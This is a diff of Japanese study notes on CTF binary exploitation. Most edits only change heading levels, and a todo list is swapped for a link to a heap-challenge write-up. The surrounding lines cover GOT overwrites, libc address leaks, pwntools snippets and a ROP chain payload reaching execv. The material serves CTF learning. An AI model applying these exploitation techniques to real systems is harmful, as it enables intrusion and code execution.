@@ -1728,8 +1728,8 @@ gdb-peda$ tel $rbp-0x30 20
 ```
 
 
-#### 覚えておきたい
-##### 方針
+### 覚えておきたい
+#### 方針
 すぐに落ちるようなプログラムは`exit`などの最後の方にある関数のGOTを`main`や`_start`に書き換えてループさせる必要がある。   
 
 そのあとに、putsやprintfを呼び出してlibc leakさせる(systemを呼び出したいがアドレスがわからない)。   
@@ -1742,7 +1742,7 @@ printf@pltのアドレスは固定。
 - `pop rdi;ret`をリターンアドレスにセットしてROP gadget (x86-64)   
 - すでに一度呼ばれた関数のGOTの下位バイトを書き換えて別のlibcの関数を呼びだす   
 
-##### 起動時の動作
+#### 起動時の動作
 ```txt
 _start -> __libc_start_main -> main という流れ
 mainでなくても_startでもループできる
@@ -1754,14 +1754,14 @@ gdb-peda$ bt
     stack_end=0x7fffffffdf78) at ../csu/libc-start.c:310
 #2  0x000000000040070a in _start ()
 ```
-##### 呼び出し規約
+#### 呼び出し規約
 - x86の場合   
 関数の引数はスタックに積まれる   
 - x64の場合   
 `rdi rsi	rdx	rcx	r8 r9`の順に引数としてレジスタが使われ、7個目以降はスタックが使われる。   
 戻り値は`rax`が使用される。   
 
-##### アドレス関係
+#### アドレス関係
 ```txt
 libc_base        = addr_libc_mainarena - offset_libc_mainarena
 libc_base        = libc_start_main - offset_libc_start_main
@@ -1808,7 +1808,7 @@ libc_gadget = libc_base + 0x4f2c5
 (high)
 ```
 `0x7fffff...`はスタックのアドレス。`0x555555...`はスタックのアドレス、であることが多い(?)。
-##### リトルエンディアン
+#### リトルエンディアン
 `ABCDEF`という入力をした場合、   
 ```txt
 gdb-peda$ x /4wx $rbp-0x90
@@ -1832,8 +1832,8 @@ RDI: 0x7fffffffdd90 --> 0x464544434241 ('ABCDEF')
 gdb-peda$ x /gx $rbp-0x88
 0x7fffffffdd98:	0x00007ffff7ffe710
 ```
-##### pwntools
-###### 文字列操作
+#### pwntools
+##### 文字列操作
 - `0x7fff1234 -> b '\x34\x12\xff\x7f'`   
 ```python
 #python3のみ
@@ -1872,7 +1872,7 @@ hex(int(str(lib_main_start_str), 16))      # 0x7fffffff12345678
 heap_addr = conn.recv(6)
 hex(u64(heap_addr.ljust(8,b'\0'))) #0x555555757260
 ```
-###### 通信関係
+##### 通信関係
 ```txt
 from pwn import *
 conn = remote("localhost", 5000)
@@ -1889,7 +1889,7 @@ libc_printf = u64(printf.ljust(8,b'\0')) # libc_printf:0x7ffff7a48e80
 
 conn.interactive()
 ```
-###### ELF解析
+##### ELF解析
 ```txt
 from pwn import *
 context(os = "linux", arch = "amd64")
@@ -1909,7 +1909,7 @@ addr_libc_str_sh    = next(libc.search(b'/bin/sh'))
 
 info('addr_libc_base    = 0x{:08x}'.format(libc_base))
 ```
-###### Rop Chain
+##### Rop Chain
 ```txt
 # puts(GOT_printf)でlibc leak
 
@@ -1940,7 +1940,7 @@ print(rop.dump())
 # 0x0020:   0x7ffff7ac8fa0 execv
 conn.sendlineafter("ID: ", "A"*40 + rop.chain() )
 ```
-##### alarmのbypass
+#### alarmのbypass
 `hexedit`でバイナリを書き換える。   
 `[Ctrl]+x`で保存   
 `[Ctrl]+c`で保存しない   
@@ -1949,7 +1949,7 @@ conn.sendlineafter("ID: ", "A"*40 + rop.chain() )
   400867:	bf 3c 00 00 00       	mov    edi,0x3c           <- bf ff ff 00 00 に書き換えてもよい
   40086c:	e8 9f fe ff ff       	call   400710 <alarm@plt> <- 90 90 90 90 90 に書き換えてalarmを無視
 ```
-##### Cの関数
+#### Cの関数
 ```txt
 ---------------------------------------------------------------------
 setbuf
@@ -2000,15 +2000,11 @@ tcacheのWiki
   
 https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn    
 Pwnの全体像がわかる。   
-  
-  
-## todo
-free, mallocの概念的理解（細かい挙動の理解と全体的な理解）   
-gdb-peadで一度tcacheとかの挙動をちゃんと確認する。   
-heap問の頻出パターンを押さえる(それまではあんまり自分で解いても意味なさそう)   
-libc_baseとかlibc.main_arenaとかの計算方法が全然わかってない   
-libc_baseよりmain_arenaの方が高いアドレスにある？   
 
+https://shift-crops.hatenablog.com/entry/2020/05/24/211147#ChildHeap-Pwn-473pt-7-solves   
+ctf4bのchildheapの解説が神。わかりやすいし神。   
+  
+  
 ## vulnhubメモ
 ### 古いバージョンのLinuxのインストール
 https://soft.lafibre.info/   
